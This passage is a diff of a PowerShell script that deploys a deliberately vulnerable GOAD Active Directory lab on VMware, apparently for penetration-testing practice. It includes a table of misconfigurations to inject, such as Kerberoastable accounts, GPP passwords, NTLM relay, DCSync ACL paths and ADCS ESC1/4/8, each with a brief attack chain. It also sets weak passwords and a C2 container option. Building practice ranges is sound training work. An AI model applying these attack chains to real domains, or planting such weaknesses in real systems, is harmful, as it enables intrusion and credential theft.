+        @{ Id="ASREP_ROAST";         Category="Kerberos";      Desc="AS-REP roastable accounts (no preauth)";                Prob=0.90; Severity="High";     AttackPath="GetNPUsers → offline crack" }
+        @{ Id="KERBEROAST";          Category="Kerberos";      Desc="Kerberoastable service accounts with weak passwords";    Prob=0.95; Severity="High";     AttackPath="GetUserSPNs → offline crack → DA" }
+        @{ Id="GPP_PASSWORDS";       Category="Credentials";   Desc="Group Policy Preferences with stored credentials";      Prob=0.70; Severity="High";     AttackPath="SYSVOL → cpassword → AES decrypt" }
+        @{ Id="LAPS_MISSING";        Category="Configuration"; Desc="LAPS not deployed on member servers";                    Prob=0.60; Severity="Medium";   AttackPath="Local admin password reuse across hosts" }
+        @{ Id="SMB_SIGNING_OFF";     Category="Network";       Desc="SMB signing not required on servers";                    Prob=0.75; Severity="High";     AttackPath="NTLM relay → DA via LDAP/SMB" }
+        @{ Id="LLMNR_ENABLED";       Category="Network";       Desc="LLMNR/NBT-NS poisoning enabled";                        Prob=0.85; Severity="Medium";   AttackPath="Responder → NTLMv2 → offline crack or relay" }
+        @{ Id="DCSYNC_PATH";         Category="ACL";           Desc="ACL path to DCSync via group nesting";                  Prob=0.50; Severity="Critical"; AttackPath="Nested groups → WriteDACL → DCSync rights" }
+        @{ Id="WEAK_ACL";            Category="ACL";           Desc="GenericAll/WriteDACL on privileged AD objects";          Prob=0.70; Severity="Critical"; AttackPath="GenericAll on user → reset password → DA" }
+        @{ Id="PRINTSPOOLER";        Category="Configuration"; Desc="Print Spooler service running on Domain Controller";     Prob=0.80; Severity="High";     AttackPath="PrinterBug/SpoolSample → coerce auth" }
+        @{ Id="ADCS_ESC1";           Category="ADCS";          Desc="Certificate template allows SAN override (ESC1)";       Prob=0.45; Severity="Critical"; AttackPath="Certipy req → DA cert → PKINIT" }
+        @{ Id="ADCS_ESC4";           Category="ADCS";          Desc="Certificate template is modifiable (ESC4)";             Prob=0.30; Severity="Critical"; AttackPath="Modify template → ESC1 → DA" }
+        @{ Id="ADCS_ESC8";           Category="ADCS";          Desc="ADCS web enrollment with NTLM relay (ESC8)";            Prob=0.40; Severity="Critical"; AttackPath="Coerce DC → relay to /certsrv → DA cert" }
+        @{ Id="WEBDAV_ENABLED";      Category="Network";       Desc="WebDAV enabled for NTLM relay via HTTP";                Prob=0.35; Severity="Medium";   AttackPath="WebDAV → NTLMv2 relay without SMB signing" }
+        @{ Id="PASSWD_IN_DESC";      Category="Credentials";   Desc="Passwords stored in AD user description fields";        Prob=0.55; Severity="Medium";   AttackPath="LDAP query descriptions → plaintext creds" }
+        @{ Id="LEGACY_NTLM";        Category="Network";       Desc="NTLMv1 authentication allowed on network";              Prob=0.40; Severity="High";     AttackPath="Downgrade NTLMv2 → NTLMv1 → crack instantly" }
     )
 
     $active = @()
     foreach ($mc in $misconfigs) {
-        if ((Get-Random -Minimum 0.0 -Maximum 1.0) -le $mc.Probability) {
+        $roll = (Get-SeededRandom -Max 1000) / 1000.0
+        if ($roll -le $mc.Prob) {
             $active += $mc
         }
     }
     return $active
 }
 
-# ─── PREREQUISITE CHECKS ────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# PREREQUISITE CHECKS (v3.0 — actionable guidance, stale process detection)
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Test-Prerequisites {
-    Write-Banner "CHECKING PREREQUISITES"
+    Write-Banner "CHECKING PREREQUISITES" -Step 1 -Total 8
 
     $errors = @()
+    $warnings = @()
+    $checks = @(
+        "VMware Workstation", "Vagrant", "Vagrant Plugins",
+        "Vagrant VMware Utility", "Git", "Python 3", "Docker Desktop",
+        "SSH Client", "System RAM", "Disk Space", "Stale Processes"
+    )
+    $passed = 0
 
-    # VMware Workstation
+    # ── VMware Workstation ──
     $vmwarePaths = @(
         "${env:ProgramFiles(x86)}\VMware\VMware Workstation",
         "$env:ProgramFiles\VMware\VMware Workstation"
@@ -259,63 +524,132 @@ function Test-Prerequisites {
     $script:VMRUN = $null
     foreach ($p in $vmwarePaths) {
         $vmrunPath = Join-Path $p "vmrun.exe"
-        if (Test-Path $vmrunPath) {
-            $script:VMRUN = $vmrunPath
-            $script:VMWARE_NETCFG = Join-Path $p "vmnetcfg.exe"
-            break
-        }
+        if (Test-Path $vmrunPath) { $script:VMRUN = $vmrunPath; break }
     }
     if (-not $script:VMRUN) {
-        # Try PATH
         $vmrunCmd = Get-Command vmrun.exe -ErrorAction SilentlyContinue
         if ($vmrunCmd) { $script:VMRUN = $vmrunCmd.Source }
-        else { $errors += "VMware Workstation not found. Install VMware Workstation Pro." }
+        else { $errors += "VMware Workstation not found. Install from https://www.vmware.com/products/workstation-pro.html" }
     }
-    if ($script:VMRUN) { Write-Log "VMware vmrun: $($script:VMRUN)" "SUCCESS" }
+    if ($script:VMRUN) { Write-Log "VMware vmrun: $($script:VMRUN)" "SUCCESS"; $passed++ }
 
-    # Vagrant
+    # ── Vagrant ──
     $vagrant = Get-Command vagrant -ErrorAction SilentlyContinue
-    if (-not $vagrant) { $errors += "Vagrant not found. Install from https://www.vagrantup.com/" }
-    else { Write-Log "Vagrant: $($vagrant.Source)" "SUCCESS" }
+    if (-not $vagrant) {
+        $errors += "Vagrant not found. Install: winget install Hashicorp.Vagrant"
+    } else {
+        $vagVer = (& vagrant --version 2>&1) -replace "Vagrant\s+",""
+        Write-Log "Vagrant: v$vagVer ($($vagrant.Source))" "SUCCESS"; $passed++
+    }
 
-    # Git
-    $git = Get-Command git -ErrorAction SilentlyContinue
-    if (-not $git) { $errors += "Git not found. Install from https://git-scm.com/" }
-    else { Write-Log "Git: $($git.Source)" "SUCCESS" }
-
-    # Vagrant VMware plugin
+    # ── Vagrant Plugins ──
     if ($vagrant) {
-        $plugins = & vagrant plugin list 2>&1
-        if ($plugins -notmatch "vagrant-vmware-desktop") {
-            Write-Log "Installing vagrant-vmware-desktop plugin..." "WARN"
-            & vagrant plugin install vagrant-vmware-desktop 2>&1
-            if ($LASTEXITCODE -ne 0) { $errors += "Failed to install vagrant-vmware-desktop plugin" }
+        $plugins = & vagrant plugin list 2>&1 | Out-String
+        $needPlugins = @()
+        if ($plugins -notmatch "vagrant-vmware-desktop") { $needPlugins += "vagrant-vmware-desktop" }
+        if ($plugins -notmatch "vagrant-reload")         { $needPlugins += "vagrant-reload" }
+        if ($needPlugins.Count -gt 0) {
+            foreach ($p in $needPlugins) {
+                Write-Log "Installing missing plugin: $p ..." "WARN"
+                & vagrant plugin install $p 2>&1 | Out-Null
+            }
         }
-        Write-Log "Vagrant VMware plugin: OK" "SUCCESS"
+        Write-Log "Vagrant plugins: OK" "SUCCESS"; $passed++
     }
 
-    # SSH
+    # ── Vagrant VMware Utility Service ──
+    $vmwareUtilSvc = Get-Service VagrantVMware -ErrorAction SilentlyContinue
+    if (-not $vmwareUtilSvc) {
+        $errors += "Vagrant VMware Utility not installed. Download: https://developer.hashicorp.com/vagrant/install/vmware"
+    } elseif ($vmwareUtilSvc.Status -ne "Running") {
+        Write-Log "Starting VagrantVMware service..." "WARN"
+        Start-Service VagrantVMware -ErrorAction SilentlyContinue
+        $vmwareUtilSvc = Get-Service VagrantVMware
+    }
+    if ($vmwareUtilSvc -and $vmwareUtilSvc.Status -eq "Running") {
+        Write-Log "Vagrant VMware Utility: Running" "SUCCESS"; $passed++
+    }
+
+    # ── Git ──
+    $git = Get-Command git -ErrorAction SilentlyContinue
+    if (-not $git) { $errors += "Git not found. Install: winget install Git.Git" }
+    else { Write-Log "Git: $(& git --version 2>&1)" "SUCCESS"; $passed++ }
+
+    # ── Python 3 ──
+    $python = Get-Command python -ErrorAction SilentlyContinue
+    if (-not $python) { $errors += "Python 3 not found. Install: winget install Python.Python.3.12" }
+    else {
+        $pyVer = & python --version 2>&1
+        Write-Log "Python: $pyVer" "SUCCESS"; $passed++
+    }
+
+    # ── Docker ──
+    $docker = Get-Command docker -ErrorAction SilentlyContinue
+    if (-not $docker) {
+        $errors += "Docker not found. Install Docker Desktop from https://www.docker.com/products/docker-desktop/"
+    } else {
+        $dockerInfo = & docker info 2>&1 | Out-String
+        if ($LASTEXITCODE -ne 0) {
+            $errors += "Docker daemon not running. Start Docker Desktop first."
+        } else {
+            $dockerVer = & docker --version 2>&1
+            Write-Log "Docker: $dockerVer" "SUCCESS"; $passed++
+        }
+    }
+
+    # ── SSH ──
     $ssh = Get-Command ssh -ErrorAction SilentlyContinue
-    if (-not $ssh) { $errors += "SSH client not found. Enable OpenSSH Client in Windows Features." }
-    else { Write-Log "SSH: $($ssh.Source)" "SUCCESS" }
+    if (-not $ssh) { $warnings += "SSH client not found. Enable: Settings → Apps → Optional Features → OpenSSH Client" }
+    else { Write-Log "SSH: available" "SUCCESS"; $passed++ }
 
-    # RAM check
+    # ── RAM ──
     $totalRAM = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
-    Write-Log "Total system RAM: ${totalRAM} MB" "INFO"
-    if ($totalRAM -lt 28000) {
-        $errors += "Less than 28 GB RAM detected ($totalRAM MB). Recommended: 32 GB."
+    if ($totalRAM -lt $MIN_RAM_MB) {
+        $errors += "Insufficient RAM: ${totalRAM}MB detected, minimum ${MIN_RAM_MB}MB required for GOAD-Light."
+    } elseif ($totalRAM -lt $RECOMMENDED_RAM) {
+        $warnings += "RAM: ${totalRAM}MB detected, ${RECOMMENDED_RAM}MB recommended. Lab may be slow."
+        $passed++
+    } else {
+        Write-Log "System RAM: ${totalRAM}MB" "SUCCESS"; $passed++
     }
 
+    # ── Disk Space ──
+    $drive = (Get-Item $SCRIPT_DIR).PSDrive.Name
+    $freeGB = [math]::Round((Get-PSDrive $drive).Free / 1GB)
+    if ($freeGB -lt 30) {
+        $errors += "Insufficient disk: ${freeGB}GB free on ${drive}:, need at least 30GB for GOAD VMs + Docker images."
+    } elseif ($freeGB -lt 50) {
+        $warnings += "Disk space: ${freeGB}GB free on ${drive}:. 50GB+ recommended."
+        $passed++
+    } else {
+        Write-Log "Disk space: ${freeGB}GB free on ${drive}:" "SUCCESS"; $passed++
+    }
+
+    # ── Stale Processes ──
+    $stalePorts = @(5986, 5985, 3389)
+    # Check for stale vagrant/vmrun processes that might conflict
+    $staleVagrant = Get-Process -Name "vagrant" -ErrorAction SilentlyContinue
+    if ($staleVagrant) {
+        $warnings += "Stale vagrant processes detected (PIDs: $($staleVagrant.Id -join ', ')). May cause conflicts."
+    } else {
+        $passed++
+    }
+
+    # ── Summary ──
+    foreach ($w in $warnings) { Write-Log $w "WARN" }
     if ($errors.Count -gt 0) {
-        Write-Banner "PREREQUISITE FAILURES"
-        foreach ($e in $errors) { Write-Log $e "ERROR" }
+        Write-Host ""
+        Write-Log "PREREQUISITE FAILURES ($($errors.Count)):" "ERROR"
+        foreach ($e in $errors) { Write-Log "  • $e" "ERROR" }
+        Write-Host ""
         throw "Prerequisites not met. Fix the above issues and re-run."
     }
-
-    Write-Log "All prerequisites passed." "SUCCESS"
+    Write-Log "All prerequisites passed ($passed checks)." "SUCCESS"
 }
 
-# ─── CONFIG LOADING & MERGING ────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# CONFIG LOADING & MERGING
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Read-ClientConfig {
     param([string]$Path)
@@ -328,6 +662,7 @@ function Read-ClientConfig {
         c2DockerImage = ""
         c2EnvVars     = @{}
         labVariant    = "GOAD-Light"
+        misconfigSeed = $MisconfigSeed
         attackerVm    = @{
             sshPort   = 22
             ramMB     = 4096
@@ -336,43 +671,78 @@ function Read-ClientConfig {
     }
 
     if (Test-Path $Path) {
-        Write-Log "Loading client config from: $Path"
-        $json = Get-Content -Path $Path -Raw | ConvertFrom-Json
-        # Merge provided fields
-        if ($json.clientName)    { $config.clientName = $json.clientName }
-        if ($json.domain)        { $config.domain = $json.domain }
-        if ($json.cidr)          { $config.cidr = $json.cidr }
-        if ($json.lowPrivUser) {
-            if ($json.lowPrivUser.username) { $config.lowPrivUser.username = $json.lowPrivUser.username }
-            if ($json.lowPrivUser.password) { $config.lowPrivUser.password = $json.lowPrivUser.password }
-        }
-        if ($json.c2DockerImage) { $config.c2DockerImage = $json.c2DockerImage }
-        if ($json.c2EnvVars) {
-            $json.c2EnvVars.PSObject.Properties | ForEach-Object {
-                $config.c2EnvVars[$_.Name] = $_.Value
+        Write-Log "Loading config: $Path" "STEP"
+        try {
+            $raw = Get-Content -Path $Path -Raw -ErrorAction Stop
+            # Validate JSON syntax
+            $null = $raw | ConvertFrom-Json -ErrorAction Stop
+            $json = $raw | ConvertFrom-Json
+
+            if ($json.clientName)    { $config.clientName = [string]$json.clientName }
+            if ($json.domain) {
+                $d = [string]$json.domain
+                # Validate domain format
+                if ($d -notmatch "^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z0-9\.\-]+$") {
+                    Write-Log "Invalid domain format '$d' in config. Randomizing." "WARN"
+                } else {
+                    $config.domain = $d
+                }
             }
+            if ($json.cidr) {
+                $c = [string]$json.cidr
+                if ($c -notmatch "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$") {
+                    Write-Log "Invalid CIDR format '$c' in config. Randomizing." "WARN"
+                } else {
+                    $config.cidr = $c
+                }
+            }
+            if ($json.lowPrivUser) {
+                if ($json.lowPrivUser.username) { $config.lowPrivUser.username = [string]$json.lowPrivUser.username }
+                if ($json.lowPrivUser.password) { $config.lowPrivUser.password = [string]$json.lowPrivUser.password }
+            }
+            if ($json.c2DockerImage) { $config.c2DockerImage = [string]$json.c2DockerImage }
+            if ($json.c2EnvVars -and $json.c2EnvVars.PSObject) {
+                $json.c2EnvVars.PSObject.Properties | ForEach-Object {
+                    $config.c2EnvVars[$_.Name] = [string]$_.Value
+                }
+            }
+            if ($json.labVariant) {
+                $v = [string]$json.labVariant
+                if ($v -notin @("GOAD-Light","GOAD","MINILAB","SCCM","NHA")) {
+                    Write-Log "Unknown lab variant '$v'. Defaulting to GOAD-Light." "WARN"
+                } else {
+                    $config.labVariant = $v
+                }
+            }
+            if ($json.misconfigSeed) { $config.misconfigSeed = [int]$json.misconfigSeed }
+            if ($json.attackerVm) {
+                if ($json.attackerVm.ramMB) { $config.attackerVm.ramMB = [int]$json.attackerVm.ramMB }
+                if ($json.attackerVm.cpus)  { $config.attackerVm.cpus = [int]$json.attackerVm.cpus }
+            }
+
+            Write-Log "Config loaded successfully." "SUCCESS"
         }
-        if ($json.labVariant)    { $config.labVariant = $json.labVariant }
-        if ($json.attackerVm) {
-            if ($json.attackerVm.ramMB) { $config.attackerVm.ramMB = $json.attackerVm.ramMB }
-            if ($json.attackerVm.cpus)  { $config.attackerVm.cpus = $json.attackerVm.cpus }
+        catch {
+            Write-Log "Failed to parse config: $_" "ERROR"
+            Write-Log "Proceeding with fully randomized lab." "WARN"
         }
-    }
-    else {
-        Write-Log "No config file at $Path — generating fully randomized lab." "WARN"
+    } else {
+        Write-Log "No config at $Path — generating fully randomized lab." "WARN"
     }
 
-    # Fill in missing fields with randomized values
-    if (-not $config.clientName)          { $config.clientName = New-RandomCompanyName }
-    if (-not $config.domain)              { $config.domain = New-RandomDomain }
-    if (-not $config.cidr)                { $config.cidr = New-RandomCIDR }
-    if (-not $config.lowPrivUser.username) { $config.lowPrivUser.username = New-RandomUsername }
-    if (-not $config.lowPrivUser.password) { $config.lowPrivUser.password = New-RandomWeakPassword }
+    # Fill missing fields with randomized values
+    if (-not $config.clientName)           { $config.clientName = New-RandomCompanyName }
+    if (-not $config.domain)               { $config.domain = New-RandomDomain }
+    if (-not $config.cidr)                 { $config.cidr = New-RandomCIDR }
+    if (-not $config.lowPrivUser.username)  { $config.lowPrivUser.username = New-RandomUsername -FirstName (Get-RandomElement $script:FIRST_NAMES) -LastName (Get-RandomElement $script:LAST_NAMES) }
+    if (-not $config.lowPrivUser.password)  { $config.lowPrivUser.password = New-RandomWeakPassword -CompanyName $config.clientName }
 
     return $config
 }
 
-# ─── NETWORK HELPERS ─────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# NETWORK HELPERS
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Get-NetworkFromCIDR {
     param([string]$CIDR)
@@ -380,14 +750,18 @@ function Get-NetworkFromCIDR {
     $ip = $parts[0]
     $mask = [int]$parts[1]
     $octets = $ip -split "\."
+    $subnet = "$($octets[0]).$($octets[1]).$($octets[2])"
     return @{
-        Network  = $ip
-        Prefix   = $mask
-        Gateway  = "$($octets[0]).$($octets[1]).$($octets[2]).1"
-        DCStart  = "$($octets[0]).$($octets[1]).$($octets[2]).10"
-        Attacker = "$($octets[0]).$($octets[1]).$($octets[2]).200"
-        Subnet   = "$($octets[0]).$($octets[1]).$($octets[2])"
-        Netmask  = if ($mask -eq 24) { "255.255.255.0" } elseif ($mask -eq 16) { "255.255.0.0" } else { "255.255.255.0" }
+        Network   = $ip
+        Prefix    = $mask
+        Gateway   = "$subnet.1"
+        DC1       = "$subnet.10"
+        DC2       = "$subnet.11"
+        SRV02     = "$subnet.22"
+        Attacker  = "$subnet.200"
+        Subnet    = $subnet
+        IpRange   = $subnet
+        Netmask   = if ($mask -eq 24) { "255.255.255.0" } elseif ($mask -eq 16) { "255.255.0.0" } else { "255.255.255.0" }
     }
 }
 
@@ -396,85 +770,61 @@ function Initialize-VMwareNetwork {
         [hashtable]$NetInfo,
         [string]$CIDR
     )
-    Write-Banner "CONFIGURING VMWARE HOST-ONLY NETWORK"
+    Write-Banner "CONFIGURING VMWARE HOST-ONLY NETWORK" -Step 2 -Total 8
 
-    # Find an available vmnet (vmnet2-vmnet19)
-    $vmnetDir = "$env:ProgramData\VMware"
-    $usedNets = @()
-    if (Test-Path "$vmnetDir\vmnetnat.conf") {
-        $usedNets += (Select-String -Path "$vmnetDir\vmnetnat.conf" -Pattern "vmnet\d+" -AllMatches).Matches.Value
-    }
+    $vmwareDir = Split-Path $script:VMRUN -Parent
+    $vnetlib = Join-Path $vmwareDir "vnetlib64.exe"
+    $targetVmnet = "vmnet2"
 
-    $targetVmnet = $null
-    for ($i = 2; $i -le 19; $i++) {
-        $candidate = "vmnet$i"
-        if ($candidate -notin $usedNets -or $i -eq 2) {
-            $targetVmnet = $candidate
-            break
+    Write-Log "Target: $targetVmnet for CIDR $CIDR" "STEP"
+
+    # Check current VMnet2 IP
+    $currentIP = Get-NetIPAddress -InterfaceAlias "VMware Network Adapter VMnet2" -AddressFamily IPv4 -ErrorAction SilentlyContinue
+    $expectedIP = "$($NetInfo.Subnet).1"
+
+    if ($currentIP -and $currentIP.IPAddress -eq $expectedIP) {
+        Write-Log "VMnet2 already configured: $expectedIP/$($NetInfo.Prefix)" "SUCCESS"
+    } else {
+        Write-Log "VMnet2 needs configuration (expected: $expectedIP, current: $(if ($currentIP) { $currentIP.IPAddress } else { 'none' }))" "WARN"
+
+        # Try vnetlib64 first
+        if (Test-Path $vnetlib) {
+            Write-Log "Configuring via vnetlib64..." "STEP"
+            & $vnetlib -- stop dhcp 2>$null
+            & $vnetlib -- set vnet $targetVmnet mask $($NetInfo.Netmask) 2>&1 | Out-Null
+            & $vnetlib -- set vnet $targetVmnet addr $($NetInfo.Network) 2>&1 | Out-Null
+            & $vnetlib -- set vnet $targetVmnet type hostonly 2>&1 | Out-Null
+            & $vnetlib -- remove dhcp $targetVmnet 2>&1 | Out-Null
+            & $vnetlib -- start dhcp 2>$null
+        }
+
+        # Ensure host adapter has the right IP
+        try {
+            if ($currentIP) {
+                Remove-NetIPAddress -InterfaceAlias "VMware Network Adapter VMnet2" -IPAddress $currentIP.IPAddress -Confirm:$false -ErrorAction SilentlyContinue
+            }
+            New-NetIPAddress -InterfaceAlias "VMware Network Adapter VMnet2" -IPAddress $expectedIP -PrefixLength $NetInfo.Prefix -ErrorAction Stop | Out-Null
+            Write-Log "VMnet2 configured: $expectedIP/$($NetInfo.Prefix)" "SUCCESS"
+        }
+        catch {
+            if ($_.Exception.Message -match "already exists") {
+                Write-Log "VMnet2 IP already set (race condition — OK)" "SUCCESS"
+            } else {
+                Write-Log "Failed to set VMnet2 IP: $_" "ERROR"
+                Write-Log "Manually run: New-NetIPAddress -InterfaceAlias 'VMware Network Adapter VMnet2' -IPAddress $expectedIP -PrefixLength $($NetInfo.Prefix)" "WARN"
+            }
         }
     }
-    if (-not $targetVmnet) { $targetVmnet = "vmnet2" }
 
-    Write-Log "Using VMware network: $targetVmnet for CIDR $CIDR"
-
-    # Configure via VMware Virtual Network Editor CLI or registry
-    # VMware stores config in: C:\ProgramData\VMware\vmnetX.conf
-    # For modern VMware Workstation, we use vmnetcfg or direct config
-
-    $vmnetConfDir = "$env:ProgramData\VMware"
-    $answerFile = Join-Path $SCRIPT_DIR "vmnet-config.txt"
-
-    # Write VMware network configuration
-    $vmnetConf = @"
-# Insta-Internal-Labinator VMware Network Config
-# Network: $targetVmnet
-# CIDR: $CIDR
-# Type: Host-Only, No DHCP
-VNET_${targetVmnet}_HOSTONLY_SUBNET=$($NetInfo.Network)
-VNET_${targetVmnet}_HOSTONLY_NETMASK=$($NetInfo.Netmask)
-VNET_${targetVmnet}_DHCP=no
-VNET_${targetVmnet}_VIRTUAL_ADAPTER=yes
-"@
-    Set-Content -Path $answerFile -Value $vmnetConf -Force
-    Write-Log "VMware network config written to $answerFile"
-
-    # Try to apply via vmnetcfg.exe if available, otherwise use vnetlib
-    $vnetlib = Join-Path (Split-Path $script:VMRUN -Parent) "vnetlib64.exe"
-    if (Test-Path $vnetlib) {
-        Write-Log "Configuring $targetVmnet via vnetlib64..."
-        $vmnetNum = $targetVmnet -replace "vmnet", ""
-
-        # Stop networking
-        & $vnetlib -- stop dhcp 2>$null
-        & $vnetlib -- stop nat 2>$null
-
-        # Configure the host-only network
-        & $vnetlib -- set vnet $targetVmnet mask $($NetInfo.Netmask) 2>&1 | ForEach-Object { Write-Log $_ }
-        & $vnetlib -- set vnet $targetVmnet addr $($NetInfo.Network) 2>&1 | ForEach-Object { Write-Log $_ }
-        & $vnetlib -- set vnet $targetVmnet type hostonly 2>&1 | ForEach-Object { Write-Log $_ }
-
-        # Disable DHCP
-        & $vnetlib -- remove dhcp $targetVmnet 2>&1 | ForEach-Object { Write-Log $_ }
-
-        # Restart networking
-        & $vnetlib -- start dhcp 2>$null
-        & $vnetlib -- start nat 2>$null
-
-        Write-Log "$targetVmnet configured: $CIDR (Host-Only, No DHCP)" "SUCCESS"
-    }
-    else {
-        Write-Log "vnetlib64.exe not found — manual VMware Virtual Network Editor configuration may be needed." "WARN"
-        Write-Log "Required settings for $targetVmnet :" "WARN"
-        Write-Log "  Type: Host-Only" "WARN"
-        Write-Log "  Subnet: $($NetInfo.Network)" "WARN"
-        Write-Log "  Mask: $($NetInfo.Netmask)" "WARN"
-        Write-Log "  DHCP: Disabled" "WARN"
-    }
+    # Warn about non-persistent IP
+    Write-Log "NOTE: VMnet2 IP may not persist across reboots. Re-run script or set manually." "WARN"
 
     return $targetVmnet
 }
 
-# ─── GOAD DEPLOYMENT ─────────────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════════
+# GOAD DEPLOYMENT (v3.0 — improved injection, resume support)
+# ═══════════════════════════════════════════════════════════════════════════════
 
 function Deploy-GOAD {
     param(
@@ -485,105 +835,197 @@ function Deploy-GOAD {
         [array]$ServiceAccounts,
         [array]$Misconfigs
     )
-    Write-Banner "DEPLOYING GOAD ($($Config.labVariant))"
+    Write-Banner "DEPLOYING GOAD ($($Config.labVariant))" -Step 3 -Total 8
 
-    # Clone GOAD if not present
+    # ── Clone GOAD ──
     if (-not (Test-Path $GOAD_DIR)) {
-        Write-Log "Cloning GOAD repository..."
-        & git clone --depth 1 $GOAD_REPO $GOAD_DIR 2>&1 | ForEach-Object { Write-Log $_ }
-        if ($LASTEXITCODE -ne 0) { throw "Failed to clone GOAD repository" }
-        Write-Log "GOAD cloned successfully." "SUCCESS"
-    }
-    else {
-        Write-Log "GOAD directory exists, pulling latest..." "INFO"
-        Push-Location $GOAD_DIR
-        & git pull 2>&1 | ForEach-Object { Write-Log $_ }
-        Pop-Location
+        Write-Log "Cloning GOAD repository..." "STEP"
+        & git clone --depth 1 $GOAD_REPO $GOAD_DIR 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
+        if ($LASTEXITCODE -ne 0) { throw "Failed to clone GOAD repository." }
+        Write-Log "GOAD cloned." "SUCCESS"
+    } else {
+        Write-Log "GOAD directory exists. Skipping clone." "SUCCESS"
     }
 
-    # Determine lab path
+    # Validate lab variant
     $labVariant = $Config.labVariant
     $labPath = Join-Path $GOAD_DIR "ad" $labVariant
     if (-not (Test-Path $labPath)) {
-        Write-Log "Lab variant '$labVariant' not found, falling back to GOAD-Light..." "WARN"
+        Write-Log "'$labVariant' not found, falling back to GOAD-Light." "WARN"
         $labVariant = "GOAD-Light"
         $labPath = Join-Path $GOAD_DIR "ad" $labVariant
-        if (-not (Test-Path $labPath)) {
-            # Try alternate path structures
-            $labPath = Join-Path $GOAD_DIR "ad" "GOAD-Light"
-            if (-not (Test-Path $labPath)) {
-                throw "Cannot find GOAD lab variant directory. Check GOAD repository structure."
+    }
+
+    # ── Apply GOAD patches for Windows+Docker ──
+    Write-Log "Applying Windows+Docker patches to GOAD..." "STEP"
+    Apply-GOADPatches
+
+    # ── Install Python deps ──
+    Write-Log "Installing GOAD Python dependencies..." "STEP"
+    Push-Location $GOAD_DIR
+    try {
+        & pip install -r requirements.yml 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Log $_ "DETAIL" }
+        & pip install rich 2>&1 | Select-Object -Last 1 | ForEach-Object { Write-Log $_ "DETAIL" }
+    } catch {
+        Write-Log "pip install had warnings (non-fatal): $_" "WARN"
+    }
+
+    # ── Build goadansible Docker image ──
+    $dockerImageExists = (& docker images goadansible --format "{{.Repository}}" 2>$null) -eq "goadansible"
+    if (-not $dockerImageExists) {
+        Write-Log "Building goadansible Docker image (first time only)..." "STEP"
+        & docker build -t goadansible . 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
+        if ($LASTEXITCODE -eq 0) { Write-Log "goadansible Docker image built." "SUCCESS" }
+        else { Write-Log "Docker image build had issues (exit: $LASTEXITCODE)" "WARN" }
+    } else {
+        Write-Log "goadansible Docker image exists. Skipping build." "SUCCESS"
+    }
+
+    # ── Generate custom Ansible extra-vars for GOAD injection ──
+    Write-Log "Generating custom Ansible variables..." "STEP"
+    New-GOADInjectionVars -Config $Config -NetInfo $NetInfo -ADUsers $ADUsers `
+                          -ServiceAccounts $ServiceAccounts -Misconfigs $Misconfigs
+
+    # ── Launch GOAD ──
+    $ipRange = $NetInfo.IpRange
+    Write-Host ""
+    Write-Log "Launching GOAD deployment..." "STEP"
+    Write-Log "  Lab:         $labVariant" "DETAIL"
+    Write-Log "  Provider:    vmware" "DETAIL"
+    Write-Log "  Provisioner: docker (Docker-based Ansible)" "DETAIL"
+    Write-Log "  IP Range:    $ipRange.X" "DETAIL"
+    Write-Log "  Estimated:   30-90 minutes" "DETAIL"
+    Write-Host ""
+
+    $goadCmd = if ($ResumeFrom) {
+        Write-Log "Resuming from playbook: $ResumeFrom" "WARN"
+        $iid = if ($InstanceId) { $InstanceId } else {
+            $ws = Get-ChildItem (Join-Path $GOAD_DIR "workspace") -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($ws) { $ws.Name } else { "" }
+        }
+        if (-not $iid) { throw "Cannot resume: no instance ID found. Use -InstanceId parameter." }
+        "python goad.py -t install -l $labVariant -p vmware -m docker -ip $ipRange -r $ResumeFrom -i $iid"
+    } else {
+        "python goad.py -t install -l $labVariant -p vmware -m docker -ip $ipRange"
+    }
+
+    Write-Log "Command: $goadCmd" "DETAIL"
+    $goadArgs = ($goadCmd -replace "^python goad\.py ","") -split "\s+"
+    & python goad.py @goadArgs 2>&1 | ForEach-Object { Write-Log $_ "DETAIL" }
+
+    if ($LASTEXITCODE -ne 0) {
+        Write-Log "GOAD exited with code $LASTEXITCODE" "WARN"
+        Write-Log "Common fixes:" "WARN"
+        Write-Log "  • Vagrant box timeout: re-run the script" "WARN"
+        Write-Log "  • Ansible failure: re-run with -ResumeFrom <playbook.yml> -InstanceId <id>" "WARN"
+        Write-Log "  • Network issue: verify VMnet2 IP with Get-NetIPAddress" "WARN"
+    } else {
+        Write-Log "GOAD deployment completed successfully!" "SUCCESS"
+    }
+
+    Pop-Location
+}
+
+function Apply-GOADPatches {
+    # Patch 1: Enable Docker provisioning on Windows
+    $depsFile = Join-Path $GOAD_DIR "goad" "dependencies.py"
+    if (Test-Path $depsFile) {
+        $content = Get-Content $depsFile -Raw
+        if ($content -match "Utils\.is_windows\(\)") {
+            $content = $content -replace "provisioner_docker_enabled\s*=\s*False\s+if\s+\(Utils\.is_windows\(\)\s+or\s+Utils\.is_wsl\(\)\)\s+else\s+True",
+                                          "provisioner_docker_enabled = False if Utils.is_wsl() else True"
+            Set-Content -Path $depsFile -Value $content -Force
+            Write-Log "Patched dependencies.py (Docker on Windows)" "SUCCESS"
+        }
+    }
+
+    # Patch 2: Add run_docker_ansible to Windows command handler
+    $winCmdFile = Join-Path $GOAD_DIR "goad" "command" "windows.py"
+    if (Test-Path $winCmdFile) {
+        $content = Get-Content $winCmdFile -Raw
+        if ($content -notmatch "run_docker_ansible") {
+            # Add import if needed
+            if ($content -notmatch "import sys") {
+                $content = $content -replace "(import subprocess)", "import subprocess`nimport sys"
             }
+            if ($content -notmatch "from goad\.goadpath") {
+                $content = $content -replace "(from goad\.command\.cmd import Command)", "`$1`nfrom goad.goadpath import GoadPath"
+            }
+            # Add method
+            $dockerMethod = @'
+
